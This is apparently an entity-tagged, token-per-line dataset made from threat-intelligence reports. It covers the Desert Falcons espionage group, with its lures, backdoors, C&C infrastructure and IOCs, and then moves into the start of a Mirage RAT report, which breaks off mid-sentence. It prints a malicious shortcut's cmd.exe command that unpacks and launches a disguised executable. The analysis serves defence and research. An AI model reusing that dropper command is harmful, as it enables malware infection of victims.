prospect
of
a
new
relationship
between
Sisi
and
Bashar
alAssad
ISIS
(
Islamic
State
in
Iraq
and
Levant
)
Terrorism
affecting
Egypt
-
the
beginning
of
the
end
is
near
Palestinian
embassies
abroad...
the
reality
of
a
weak
role
_Maram
Mabrouk
Gaza
fishermen
,
facing
poverty
and
harassment
until
when
?

.docx.scr
Financial
Decision
No
.

17
concerning
the
military
forces
Sexual
harassment
in
the
prime
minister
's
office
Synagogue
attack
Political
report
on
the
latest
national
events
.scr
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
9
Below
are
some
examples
of
the
interesting
content
used
to
target
important
victims
:
A
PDF
of
a
Meeting
Record
was
used
when
targeting
senior
politicians
in
Egypt
and
Palestine
.

The
document
was
used
in
spear
phishing
and
contains
what
appear
to
be
the
Meeting
Minutes
for
a
very
important
meeting
between
political
leaders
in
Egypt
and
Palestine
.

Documents
used
when
targeting
politicians
in
Egypt
and
Palestine
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
10
Documents
used
when
targeting
activists
in
Israel
and
Palestine
4.1.2
.

Just
click
the
shortcut
:
the
rar/lnk
trick
Another
technique
used
by
the
cybercriminals
is
to
send
a
rar
file
that
extracts
to
multiple
files
and
offers
an
appealing
shortcut
in
the
form
of
a
small
,
innocent-looking
icon
.

In
this
case
the
victim
does
not
need
to
double-click
an
executable
file
,
the
shortcut
is
enough
to
run
a
whole
command
to
extract
,
setup
and
run
the
malware
.

C:\Windows\System32\cmd.exe
/c
'md
c
:
\LA
&
attrib
c
:
\LA
+h
+s&C:\Progra~1\WinRAR\unrar.exe
e
_*.rar
c
:
\LA\
-o+
-ibck
&
copy
/y
_*.doc
c
:
\LA\&C:\Progra~1\WinRAR\winRAR.exe
e
-e
c:\LA\_*.doc
c
:
\LA\
-o+
-ibck
&
ren
c:\LA\image21.jpeg
alg.exe&start
c:\LA\alg.exe
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
11
4.1.3
.

Right-to-left
extension
override
trick

This
method
takes
advantage
of
special
characters
in
Unicode
to
reverse
the
order
of
characters
in
a
file
name
,
hiding
the
dangerous
file
extension
in
the
file
name
and
placing
a
harmless-looking
fake
file
extension
near
the
end
of
the
file
name
.

By
using
this
technique
,
even
careful
users
with
good
technical
knowledge
could
be
tricked
into
running
malicious
files
.

4.1.4
.

Social
Networking
tricks

Targeted
Facebook
attacks
aimed
at
specific
people
The
DESERT B_malware.drop
Falcons I
team
is
among
to
the
first
to
run
targeted
attacks
through
Facebook
chat
.

The
attackers
created
authentic
Facebook
accounts
and
then
interacted
with
chosen
victims
through
common
Facebook
pages
until
they
had
gained
their
trust
.

Then
they
sent
them
Trojan
files
in
the
chat
hidden
as
an
image
or
similar
.

Below
are
some
screenshots
of
a
victim
's
PC
showing
the
infection
process
,
extracted
from
one
of
the
command
and
control
servers
:
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
12
Malware
files
being
sent
as
me.rar
or
mypic.rar
from
fake
accounts
to
the
victims
through
chat

Facebook
attacks
targeted
at
generic
activists
and
political
followers
(
mass
infection
)

For
wider
infections
,
especially
among
activists
and
political
figures
,
different
social
engineering
techniques
were
used
.

These
included
Facebook
posts
and
redirects
to
fake
pages
with
political
content
.

We
were
able
to
identify
suspect
Facebook
posts
on
popular
activist
pages
,
with
links
to
domains
or
malware
downloads
used
by
Falcons B_malware.drop
.

Below
are
a
few
examples
:
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
13
Posts
made
from
compromised
or
fake
accounts
on
political
pages
;
Dr
Salam
Fayyad
is
a
former
prime
minister
of
the
state
of
Palestine
.

Another
post
with
malicious
content
,
this
time
on
the
page
of
Benjamin
Netanyahu
,
the
current
prime
minister
of
Israel
.

4.1.5
.

The
fake
RealPlayer
plugin
trick

In
this
case
political
social
engineering
was
used
to
deliver
malware
as
a
'plugin
'
for
the
'
banned
video
'
of
a
famous
political
show
in
Egypt
hosted
by
the
satirist
Bassem
Youssef
.

The
page
was
hosted
on
the
following
domain
:
www.linkedim.in B_url.normal
,
chosen
to
resemble
the
popular
LinkedIn
social
networking
site
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
14

4.2
.

Infiltrate
and
Spy

The
DESERT B_malware.drop
Falcons I
depend
on
two
different
backdoors
to
spy
on
victims
.

Both
backdoors
are
homemade
and
are
under
continuous
development
.

We
were
able
to
identify
and
collect
more
than
100
malware
samples
used
by
the
DESERT B_malware.drop
Falcons I
.

Once
they
have
infected
the
victim
's
computer
,
attackers
have
full
access
and
control
,
and
they
usually
proceed
as
follows
:
1
.

New
victims
are
categorized
into
groups
before
being
infected
(
e.g.
A001
,
A002
,
and
so
on
)
2
.

One
of
the
cybercriminals
is
appointed
to
each
new
victim
after
infection
3
.

A
complete
list
of
all
files
(
especially
XLS
,
DOC
,
JPG
and
WAV
)
is
retrieved
from
the
victim
's
machine
4
.

The
cybercriminal
browses
and
collects
any
interesting
pictures
and
files
5
.

The
cybercriminal
also
collects
chats
and
screenshots
6
.

Depending
on
the
importance
of
the
victim
,
the
surveillance
is
then
either
intensified
or
dropped
4.2.1
.

The
Falcons B_malware.drop
'
main
Trojan

This
is
the
main
Trojan
used
in
the
attacks
,
especially
when
targeting
important
victims
.

Multiple
versions
of
the
Trojan
were
found
,
revealing
ongoing
development
and
improvements
.

The
Falcons B_malware.drop
'
main
Trojan
is
divided
into
two
modules
:

4.2.1.1
.

Falcons B_malware.drop
'
Downloader

This
module
is
used
for
the
initial
infection
.

Once
executed
,
the
Falcons B_malware.drop
'
downloader
will
send
a
registration
request
to
the
Command
and
Control
(
C&C
)
server
with
the
victim
's
IP
address
and
a
harddisk
ID
.

The
downloader
will
request
a
registration
confirmation
from
the
C&C
.

Encrypted
versions
of
the
latest
Falcons B_malware.drop
'
backdoor
will
then
be
downloaded
and
installed
on
the
victim
's
machine
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
15
4.2.1.2
.

Falcons B_malware.drop
'
Backdoor
The
Falcons B_malware.drop
'
backdoor
communicates
with
C&C
servers
using
HTTP
requests
with
encrypted
content
,
providing
the
attackers
with
full
backdoor
functionality
including
:
•
Screenshots
•
Keylogs
•
Upload
/
Download
files
•
Information
on
all
the
.doc
and
.xls
files
on
the
victim
's
hard
disk
or
connected
USB
devices
•
The
ability
to
steal
passwords
stored
on
the
system
registry
(
Internet
Explorer
and
live
Messenger
)
All
the
files
and
screenshots
collected
by
the
backdoor
are
sent
to
the
C&C
in
a
password-protected
archive
.

The
earliest
sample
we
found
of
the
Falcons B_malware.drop
'
Trojan
was
compiled
in
Feb
2013
.

We
consider
this
to
be
the
real
start
date
for
the
infection
activity
.

(
c07ac2120b4312b33089c0
cc97405876
,
MSN.exe
)
.

4.2.2
.

DHS
spyware

DHS
naming
is
used
by
the
attackers
to
describe
the
nickname
initials
of
one
of
the
developers
(
D**
H***
Spyware
)
.

From
June
2014
,
the
Falcons B_malware.drop
began
using
a
new
,
totally
rewritten
backdoor
,
the
'DHS
spyware
'
,
is
built
by
a
different
development
team
.

This
also
provided
the
attackers
with
control
over
the
infected
systems
,
serving
the
same
goals
as
before
through
the
following
functionalities
:
•
Screenshots
and
Keylogs
•
Audio
recording
•
Downloading
and
Uploading
files
•
Password
stealing
•
Interactive
shell
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
16
DHS
builder
,
used
to
bind
malware
with
an
icon
and
the
category
to
which
the
victim
belongs
.

Screen
shot
for
DHS
C
&
C
management
console
4.2.3
.

DHS2015
,
also
called
iRat

Beginning
2015
,
DHS
released
a
new
,
almost
final
version
of
the
Trojan
malware
,
now
packed
with
new
features
and
techniques
to
escape
detection
,
but
also
adding
encryption
to
the
C&C
communication
and
file
storage
.

The
new
malware
has
been
named
DHS2015
or
iRAT
.

4.2.4
.

Mobile
backdoor
traces
During
the
investigation
of
the
C&C
servers
we
found
traces
of
data
pointing
to
mobile
Trojan
logs
on
the
C
&
C
www.fpupdate.info
.

The
traces
represent
a
structure
for
a
mobile
spying
command
server
,
the
server
contains
mobile
Call
logs
,
SMS
logs
and
Geolocation
tracking
for
more
than
360
victims
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
17
4.2.5
.

Other
tools
by
DHS
The
cybercriminals
also
developed
other
tools
,
for
example
,
a
public/private
key-based
file
cryptor/decryptor
tool
.

MD5
:
363d7b99fee999a4c39a2a1052fa7919 B_hash

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
18
4.2.6
.

Compilation
timeline
for
samples

The
malware
files
compilation
timeline
for
the
collected
samples
clearly
shows
the
Falcons B_malware.drop
'
activity
and
operations
,
which
started
in
2013
and
increased
dramatically
in
2014
.

4.3
.

Track
and
Control
The
DESERT B_malware.drop
Falcons I
'
operation
can
be
divided
into
three
different
campaigns
,
each
operated
from
a
different
C&C
/
IP
,
targeting
different
types
of
victims
and
operated
mostly
by
different
team
members
.

The
campaigns
can
be
classified
by
the
type
and
version
of
malware
and
the
type
of
victims
targeted
:
•
Campaign
1
:
Active
in
Palestine
,
Egypt
,
Jordan
and
the
Gulf
states
(
KSA
,
UAE
and
Qatar
)
•
Campaign
2
:
Active
in
Israel
•
Campaign
3
:
Active
in
Egypt
4.3.1
.

1st
Campaign
-
targeting
computer
devices
and
mobiles

This
is
the
main
Falcons B_malware.drop
'
campaign
and
included
the
highest
number
of
victims
.

It
focused
mainly
high
profile
victims
in
Palestine
,
Jordan
,
Egypt
and
the
Gulf
states
,
and
the
target
victims
were
mainly
government
organizations
,
military
centers
and
top
media
outlets
.

C&C
Domains
IPs
ahmedfaiez.info
188.40.75.132 B_ip.cncsvr
188.40.106.84 B_ip.cncsvr
Victims
Media
&
Government
Malware
used
Registration
Date
Falcons B_malware.drop
Trojan
2013-03-29
fpupdate.info B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
Mobile
Falcons B_malware.drop
Trojan
2013-04-14
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
19
C&C
Domains
IPs
Victims
Malware
used
Registration

Date
flushupate.com B_url.cncsvr
188.40.75.132 B_ip.cncsvr
flushupdate.com B_url.cncsvr
188.40.75.132 B_ip.cncsvr

Media
ineltdriver.com B_url.cncsvr
188.40.75.132 B_ip.cncsvr
Military
&
Government
Falcons B_malware.drop
Trojan
Falcons B_malware.drop
Trojan
Falcons B_malware.drop
Trojan
2014-02-16
2014-02-16
2014-09-14
mediahitech.info
188.40.106.84 B_ip.cncsvr
Unknown
Falcons B_malware.drop
Trojan
2012-06-28

4.3.2
.

2nd
Campaign
This
campaign
mainly
targeted
victims
in
Israel
using
the
main
Falcons B_malware.drop
Trojan
.

More
than
600
victims
have
been
identified
.

C&C
Domains
IPs
Victims
Malware
used
Registration
Date
mixedwork.com B_url.cncsvr
188.40.81.136 B_ip.cncsvr
Israeli
Victims
plmedgroup.com B_url.cncsvr
188.40.81.136 B_ip.cncsvr
Israeli
Victims
pstcmedia.com B_url.cncsvr
188.40.81.136 B_ip.cncsvr
Unknown
,
currently
sinkholed
Falcons B_malware.drop
Trojan
Falcons B_malware.drop
Trojan
Falcons B_malware.drop
Trojan
2014-02-18
2014-02-18
2013-07-04
4.3.3
.

3rd
Campaign
This
targeted
mainly
activists
,
political
figures
and
radio
/
TV
channels
in
Egypt
.

It
's
the
only
campaign
in
the
Falcons B_malware.drop
'
operations
that
used
the
DHS
spyware
.

C&C
Domains
IPs
advtravel.info
188.40.106.84 B_ip.cncsvr
linksis.info
188.40.106.84 B_ip.cncsvr
Victims
Activists
Politicians
and
Activists
Malware
used
Registration
Date
DHS
Spyware
2013-11-17
DHS
2015
/
IRat
2014-12-01
Besides
being
the
only
campaign
to
use
DHS
spyware
,
we
can
confirm
this
is
also
the
most
recent
,
managed
by
new
and
less
experienced
group
members
.

This
is
apparent
from
mistakes
made
in
the
campaign
operation
.

For
example
,
the
C
&
C
server
advtravel.info
was
publicly
accessible
,
despite
containing
files
,
screenshots
and
information
collected
from
the
victims
and
the
backdoor
execution
logs
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
20

File
and
folder
structure
on
one
of
the
command
servers
.

For
a
short
time
the
file
access
permissions
for
the
command
servers
were
made
public
.

4.3.4
Liptona.net
One
of
the
interesting
findings
that
could
indicate
an
earlier
start
to
the
Falcons B_malware.drop
'
operations
is
the
Liptona.net
domain
.

The
hosting
history
for
this
domain
shows
that
between
21
June
2012
and
December
2013
,
this
domain
was
pointing
to
one
of
the
IPs
(
188.40.106.84 B_ip.cncsvr
)
used
by
the
Falcons B_malware.drop
.

We
were
able
to
find
a
malware
sample
using
Liptona.net
as
a
C
&
C
(
667b5004fa197beb0129e1ddbc416864
)
.

This
sample
has
some
similarities
to
the
Falcons B_malware.drop
'
main
backdoor
and
the
compilation
time
for
the
sample
points
back
to
Dec
2011
.

One
interesting
thing
is
that
this
sample
tries
to
steal
login
credentials
for
hardcoded
URLs
of
Palestinian
websites
,
an
indication
of
a
shared
goal
with
the
Falcons B_malware.drop
'
team
.

Websites
hardcoded
in
the
malware
:
•
http://mail.mtit.pna.ps/src/login.php B_url.unknown
(
Email
Ministry
of
Telecommunications
and
Information
Technology
Palestine
)
•
http://myaccount.jawwal.ps/ B_url.unknown
(
Jawwal
Mobile
provider
)
•
http://portal.iugaza.edu.ps/ B_url.unknown
(
Islamic
University
of
Gaza
)
Malware
using
liptona.net
as
C&C
containing
hardcoded
URLs
for
Palestinian
websites
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
21

4.3.4
.

Campaigns
operational
timeline

Even
though
malware
files
were
only
traced
back
to
2013
,
domain-related
traces
were
found
that
may
indicate
earlier
activities
by
the
DESERT B_malware.drop
Falcons I
:
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
22
5
.

Attribution
The
investigation
into
the
DESERT B_malware.drop
Falcons I
cybermercenaries
enabled
the
research
team
to
determine
the
identity
of
some
members
of
the
group
behind
the
development
and
operation
of
the
campaigns
.

The
DESERT B_malware.drop
Falcons I
team
members
count
around
30
,
working
in
three
teams
and
operating
mainly
from
Palestine
,
Egypt
and
Turkey
.

We
also
confirmed
that
the
cybercriminals
are
native
Arabic
speakers
from
the
Middle
East
,
based
on
evidence
from
:
•
The
identities
found
•
The
fact
that
most
malware
files
have
the
PE
resource
'Version
Info
'
with
'Lang
property
'
set
to
'Arabic
'
•
Arabic
User
names
for
the
C&C
administrators
•
Arabic
names
and
emails
found
in
the
registration
history
of
the
C&C
domains
•
Solid
Arabic
phishing
emails
and
documents
used
in
attacks
•
DHS
spyware
command
and
control
panel
with
Arabic
interface
The
identities
of
some
of
the
cybercriminals
were
found
when
inspecting
the
contents
of
one
of
the
C
&
Cs
which
had
public
read
permissions
open
for
a
short
period
of
time
.

We
were
able
to
track
and
identify
the
full
profile
of
some
of
the
attackers
including
Facebook
and
twitter
accounts
,
private
blogs
and
websites
.

Surprisingly
the
attackers
have
published
on
twitter
some
information
about
their
development
of
the
spyware
and
the
command
servers
.

TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
23
6
.

Conclusion
The
DESERT B_malware.drop
Falcons I
'
attacks
show
clearly
that
zeroday
techniques
are
not
a
must
for
efficient
targeted
attacks
.

Using
phishing
emails
,
social
engineering
and
homemade
tools
and
backdoors
,
the
DESERT B_malware.drop
Falcons I
were
able
to
infect
hundreds
of
sensitive
and
important
victims
in
the
Middle
East
region
through
their
computer
systems
or
mobile
devices
.

This
is
just
an
alert
for
the
poor
cyber
security
situation
in
the
region
.

Banks
,
Media
outlets
,
Governments
and
Military
entities
in
different
countries
all
fell
prey
to
the
DESERT B_malware.drop
Falcons I
'
attacks
.

Falcons B_malware.drop
'
threat
actors
are
determined
,
active
and
have
good
technical
knowledge
.

We
expect
their
operations
to
carry
on
developing
more
Trojans
and
using
more
advanced
techniques
.

With
enough
funding
,
they
might
be
able
to
acquire
or
develop
exploits
that
would
increase
the
efficiency
of
their
attacks
DESERT B_malware.drop
Falcons I
is
just
one
example
of
the
rise
of
cybercrime
in
a
geopolitically
troubled
region
that
will
motivate
other
threat
actors
or
states
to
leverage
cyber
attacks
for
political
or
criminal
goals
.

Kaspersky
Lab
detects
all
the
malware
files
as
follows
:
•
Trojan.Win32.DESERTFalcons B_malware.drop
•
Trojan-Spy.Win32.Agent.cncc B_malware.drop
•
Trojan-Spy.Win32.Agent.ctcr B_malware.drop
•
Trojan-Spy.Win32.Agent.ctcv B_malware.drop
•
Trojan-Spy.Win32.Agent.ctcx B_malware.drop
•
Trojan-Spy.Win32.Agent.cree B_malware.drop
•
Trojan-Spy.Win32.Agent.ctbz B_malware.drop
•
Trojan-Spy.Win32.Agent.comn B_malware.drop
•
Trojan.Win32.Bazon.a B_malware.drop
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
24
7
.

Appendix
7.1
.

Appendix
1
:
C&Cs
Whois
History
Domain
First
Related
Registration
Date
ahmedfaiez.info B_url.cncsvr
2013-03-29
fpupdate.info B_url.cncsvr
linkedim.in B_url.cncsvr
pstcmedia.com B_url.cncsvr
advtravel.info B_url.cncsvr
flushupate.com B_url.cncsvr
flushupdate.com B_url.cncsvr
mixedwork.com B_url.cncsvr
plmedgroup.com B_url.cncsvr
ineltdriver.com B_url.cncsvr
iwork-sys.com B_url.cncsvr
androcity.com B_url.cncsvr
linksis.info B_url.cncsvr
2013-4-14
2013-05-29
2013-07-04
2013-11-17
2014-02-16
2014-02-16
2014-02-18
2014-02-18
2014-09-14
2014-09-17
2014-11-17
2014-12-01
IP
addresses
188.40.75.132 B_ip.cncsvr
188.40.106.84 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.81.136 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.106.84 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.81.136 B_ip.cncsvr
188.40.81.136 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.75.132 B_ip.cncsvr
188.40.106.84 B_ip.cncsvr
188.40.106.84 B_ip.cncsvr
7.2
.

Appendix
2
:
IOC
&
Samples
The
following
Indicators
of
Compromise
can
be
used
to
identify
Falcons B_malware.drop
infections
.

7.2.1
.

Known
'
Falcons B_malware.drop
'
C&C
hostnames
•
advtravel.info B_url.cncsvr
•
ahmedfaiez.info B_url.cncsvr
•
pstcmedia.com B_url.cncsvr
•
mixedwork.com B_url.cncsvr
•
flushupate.com B_url.cncsvr
•
flushupdate.com B_url.cncsvr
•
ineltdriver.com B_url.cncsvr
•
liptona.net B_url.cncsvr
•
mediahitech.info B_url.cncsvr
•
fpupdate.info B_url.cncsvr
•
plmedgroup.com B_url.cncsvr
•
linksis.info B_url.cncsvr
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
25
7.2.2
.

Related
Domains
•
linkedim.in B_url.normal
•
iwork-sys.com B_url.normal
•
nauss-lab.com B_url.normal
•
nice-mobiles.com B_url.normal
•
facebook-emoticons.bitblogoo.com B_url.normal
•
abuhmaid.net B_url.normal
•
blogging-host.info B_url.normal
•
androcity.com B_url.normal
•
tvgate.rocks B_url.normal

7.2.3
.

Known
'
Falcons B_malware.drop
'
C&C
IPs
•
188.40.75.132 B_ip.cncsvr
•
188.40.81.136 B_ip.cncsvr
•
188.40.106.84 B_ip.cncsvr
7.2.4
.

MD5s
of
backdoors
used
in
the
attacks
003082ee859edccd104ab4cb38deb131 B_hash
00eef6a2ac57e987f4750c6eff4e93d6 B_hash
01f68cad955b14f4849e3796a834cd44 B_hash
02ffcfdcfb205cece05597fce1b307b7 B_hash
03ea5a6c095b025e111a64a32a1d1460 B_hash
07f0e2104773deec4ec351af40441b84 B_hash
0ee6b2296df8c7e5aabfee46baef2a08 B_hash
10a2212d23f8e248b59cfbf6b809e312 B_hash
12dee292c0ce4ec005f9b55ee53e2b4e B_hash
15c5c4ca7bd169cc4a1747971afe4f02 B_hash
1691aca2b2209ddb76d5107da92861e7 B_hash
17bfc2f4efc1031b33835ca3ec0a71fa B_hash
1b26203d329a6663dfcb286bc4702c77 B_hash
1e52a293838464e4cd6c1c6d94a55793 B_hash
22e90e502bd4c8c19480e987cc46a9a8 B_hash
238b48338c14c8ea87ff7ccab4544252 B_hash
23d6eef34724f2b83f4181d3df47ce69 B_hash
2804dce3a379b9ab5457c095dc93df91 B_hash
2986d9af413cd09d9ffdb40040e5c180 B_hash
2b94213b0ba7200742a08992b69a127a B_hash
2bce2ccd484a063e5e432a6f651782d9 B_hash
33d56702729fd2bc5eb0f467663b03b4 B_hash
418cf0044b8e0e8db6270454f617c636 B_hash
436a7ad10b379ddc0a454e5129dc3ba6 B_hash
4a0ef41272210f41b987224ff57f6280 B_hash
4b521edf765d1369303d36cc3024c19d B_hash
4fbf48b61d2f2f590ae35f8f65867e40 B_hash
518a765d999191b9ed7c4730714def31 B_hash
59482460da44c3d7192970e705688162 B_hash
5bb619dcb0c9684e0bbdf6d85769dbdd B_hash
5d7ba3b5780592c6e31be70a9077a8ed B_hash
63c480b1cc601b02b4acb30309b007e6 B_hash
667b5004fa197beb0129e1ddbc416864 B_hash
686779709226c6727bd9ebc4b1ff21b1 B_hash
6fcc6c2e32fc8cee3fab0ac6fd6194cd B_hash
6ff73820c23551225de0ca08c2fc4397 B_hash
7075c9a874ab5b0c27942714394f3885 B_hash
72ef4096acd0b9274d5d6f2d981eb724 B_hash
73c46bacc471db08a6c0e31caef3f9e8 B_hash
74d8b882efae9fea1787f1558589fecb B_hash
76f74b24480bc1a42998c9440ddc2fad B_hash
79ac7484d4ad1608cc939ed0ae6e02e8 B_hash
7ac102b740b299824e34394f334b5508 B_hash
7ed79032a1ad8535242428e69507ca0a B_hash
8b5b5c9852f48fa4430943fd8412e0fb B_hash
8bbad466f2257e05f66ece621ccf2056 B_hash
91510aa0bbf961a34f0326fbaf2bcbb1 B_hash
9469ff12c582cf7943582dd28a1920cc B_hash
96d56c4a5426466f2a0dc3813386818d B_hash
a1b7f8f3cf6dee880028bd6db8111a1d B_hash
a313d1092c5245da1c20ac05915a3d11 B_hash
a4a390f90be49b2bb51194d0844fed7f B_hash
a668c1dbdcdf2d561bea512361b101b9 B_hash
a73ec37e872b49e5736cc06193105df9 B_hash
aba4d663404a807581af7f20105f36d5 B_hash
b1060166e3e1ba567634fbc96bd0c27d B_hash
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
26
b23c2925ee2d48517d17d4886e21c630 B_hash
b2d6091ff886b0745fbddf9d61b42064 B_hash
b312d48899c00e8bbaaff72503a07de8 B_hash
b71c734112f6351f867ae55229901722 B_hash
b71dc1257d200783f549822c502173fc B_hash
bac3b1fbe839af1db4692a747a389e48 B_hash
c07ac2120b4312b33089c0cc97405876 B_hash
c60ada815212fc9c58fb801f99c230a4 B_hash
cc0d753dce58c74011bbb1c116d10e1b B_hash
d048a6a8377a865f07cbc2429ffaa3e7 B_hash
d5d0be0b0a9ee793eac9af45f9b14a2e B_hash
d7341d147c8d63137ed7a0b365ccc56e B_hash
decb846191be54c441677bb1da264029 B_hash
dff746868a1559de9d25037e73c06c52 B_hash
e763e2a3b0b1ed43447afe281e134e95 B_hash
f3d9689121a996f68533bd78eb6a18d9 B_hash
f4926f3bacdc2fa78b47c93b9123a5bc B_hash
f75cebd9a5d2f367117109845561e2d4 B_hash
fac66827a8cf3197358c1eaf1d6aa2bf B_hash
3340360a84d5e186221cd129159788a7 B_hash
f78fcd4eaf3d9cd95116b6e6212ad327 B_hash
aefea9d795624da16d878dc9bb81bf87 B_hash
cb87b5d46015f8416d9d3a50bfc0cf19 B_hash
3f879b77a5bd4cf5cf20ac6072fdbf5d B_hash
560f7807da12409779a2dc71e06bcebe B_hash
5aca63d39b56206e0c8c9a084d0446a3 B_hash
4ff74ab38668b524b85fd51825efe3fc B_hash
52e50e109861d530e44eaf0ec2704751 B_hash
71af60e77a148e45dbdec4de8411e16f B_hash
2607abe604832363514eb58c33a682fc B_hash
e7cf1f540f773b35f8ad988d14d7226e B_hash
bbc79bca19b0ebb95cb9cc69cc656382 B_hash
2b3baed817a79109824d3a8a94f6c317 B_hash
6B74ACF4246F9C85ED6D020330FBEC39 B_hash
D146C3A288AD021B25D7241431F7494C B_hash
8B1EFE545D1ABE35FF095F8A1D35FAAE B_hash
b1bc9b06e3aa12fb899cd715abbeb257 B_hash
4e2405d93e541f9bae34564c80f7432e B_hash
fa6fbd1dd2d58885772bd0b37633d5d7 B_hash
7.2.5
.

Backdoor
related
files
%
systemdrive%\ProgramData\cloud\skype.exe
%
systemdrive%\ProgramData\cloud\msnn.dll
%
systemdrive%\ProgramData\cloud\pluse.dll
%
systemdrive%\ProgramData\skypee\skype.exe
%
systemdrive%\ProgramData\skypee\msnn.dll
%
systemdrive%\ProgramData\skypee\pluse.dll
%
systemdrive
%
\Program
Files\Messenger\MSN.exe
%
systemdrive
%
\Program
Files\Messenger\msnn.dll
%
systemdrive
%
\Program
Files\Messenger\pluse.dll
%
systemdrive%\ProgramData\syn\Skype.exe
%
systemdrive%\ProgramData\syn\msnn.dll
%
systemdrive%\ProgramData\syn\pluse.dll
7.2.6
.

Attacker
e-mail
accounts
used
in
spear
phishing
attacks
newsletar05@gmail.com
ynet48@gmail.com
mako22014@gmail.com
italy.officce@gmail.com
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
27
Securelist
,
the
resource
for
Kaspersky
Lab
experts
'
technical
research
,
analysis
,
and
thoughts
.

DailyBusiness
Academy
Eugene
SecureList
ThreatPost
Follow
us
Kaspersky
Lab
global
Website
DailyBusiness
Academy
Eugene
ThreatPost
Eugene
Kaspersky
Blog
Daily
Kaspersky
Lab
B2C
Blog
DailyBusiness
Kaspersky
Lab
B2B
Blog
DailyBusiness
Academy
ThreatPost
Kaspersky
Lab
security
news
service
DailyBusiness
Academy
Kaspersky
Lab
Academy
TLP
:
White
For
any
inquiries
,
please
contact
intelreports@kaspersky.com
28
Kaspersky
Lab
HQ
39A/3
Leningradskoe
Shosse
Moscow
,
125212
Russian
Federation
more
contact
details
Tel
:
+7-495-797-8700
Fax
:
+7-495-797-8709
The
Mirage B_malware.infosteal
Campaign
Author
:
Silas
Cutler
,
Dell
SecureWorks
Counter
Threat
Unit
(
TM
)
Threat
Intelligence
Date
:
18
September
2012
URL
:
http://www.secureworks.com/research/threats/the-mirage-campaign/ B_url.normal

Introduction
Since
April
2012
,
the
Dell
SecureWorks
Counter
Threat
UnitTM
(
CTU
)
research
team
has
been
tracking
a
cyber
espionage
campaign
that
uses
a
remote
access
trojan
(
RAT
)
named
Mirage B_malware.infosteal
(
also
known
as
MirageFox B_malware.infosteal
)
.

This
ongoing
attack
has
targeted
a
high-profile
oil
company
in
the
Phillipines
,
a
military
organization
in
Taiwan
,
an
energy
company
in
Canada
,
and
several
as
yet
unidentified
entities
in
Brazil
,
Israel
,
Egypt
and
Nigeria
.

Analysis

Distribution
vector

Based
on
the
data
collected
by
the
CTU
research
team
,
the
campaign
's
primary
attack
vector
is
spearphishing
email
that
targets
mid-level
to
senior-level
executives
.

These
emails
contain
an
attachment
that
includes
a
malicious
payload
that
installs
a
copy
of
Mirage B_malware.infosteal
.

CTU
researchers
have
identified
several
files
that
drop
and
execute
a
copy
of
Mirage B_malware.infosteal
onto
a
target
system
.

These
'droppers
'
are
designed
to
look
and
behave
like
PDF
documents
.

However
,
the
droppers
are
stand-alone
executable
files
that
open
an
embedded
PDF
file
and
execute
the
Mirage B_malware.infosteal
trojan I
.

In
one
example
,
CTU
researchers
observed
an
executable
file
(
MD5
hash
ce1cdc9c95a6808945f54164b2e4d9d2 B_hash
)
that
upon
execution
drops
a
copy
of
Mirage B_malware.infosteal
and
opens
an
embedded
PDF
of
a
news
story
titled
'Yemeni
Women
can
participate
in
politics
just
like
men
,
says
President
Saleh
'
that
was
posted
on
the
Yemen
Observer
's
website
.

Behavior
analysis

The
CTU
research
team
has
identified
two
main
variants
of
the
Mirage B_malware.infosteal
trojan I
.

These
variants
are
based
on
key
evolutionary
differences
in
the
execution
and
encodings
used
in
communication
with
the
command
and
control
(
C2
)
servers
.

When
Mirage B_malware.infosteal
executes
,
the
original
file
copies
itself
to
a
folder
under
C
:
\Documents
and
Settings\
<
USER
>
\
or
C
:
\Windows\
and
then
deletes
the
original
file
.

After
the
initial
copy
,
Mirage B_malware.infosteal
starts
the
newly
created
file
and
exits
the
original
.

The
newly
started
copy
creates
registry
keys
to
ensure
that
the
system
remains
infected
after
every
reboot
.

CTU
researchers
have
observed
the
following
filenames
created
after
execution
:
svchost.exe
ernel32.dll
thumb.db
csrss.exe
Reader_SL.exe
MSN.exe

Phone-home
and
C2
operations

The
data
sent
by
Mirage
shares
attributes
with
the
malware
family
known
as
JKDDOS B_malware.ddos
,
which
was
researched
by
Arbor
Networks
.

In
its
initial
phone-home
connection
,
JKD-DOS B_malware.ddos
sends
a
system
profile
to
the
C2
server
.

This
profile
contains
the
CPU
speed
,
memory
size
,
system
name
and
username
.

Similar
information
and
encoding
techniques
are
seen
in
the
initial
phone-home
requests
of
Mirage
infections
.

Mirage B_malware.infosteal
phones
home
to
its
C2
servers
using
a
standard
HTTP
request
.

From
the
activity
CTU
researchers
have
observed
when
executing
Mirage B_malware.infosteal
in
a
malware
sandbox
,
this
communication
commonly
occurs
over
ports
80
,
443
and
8080
,
and
it
can
implement
SSL
for
added
security
.

The
earliest
variant
of
Mirage B_malware.infosteal
uses
an
HTTP
POST
request
to
transmit
the
initial
phone-home
request
.
This
phone-home
request
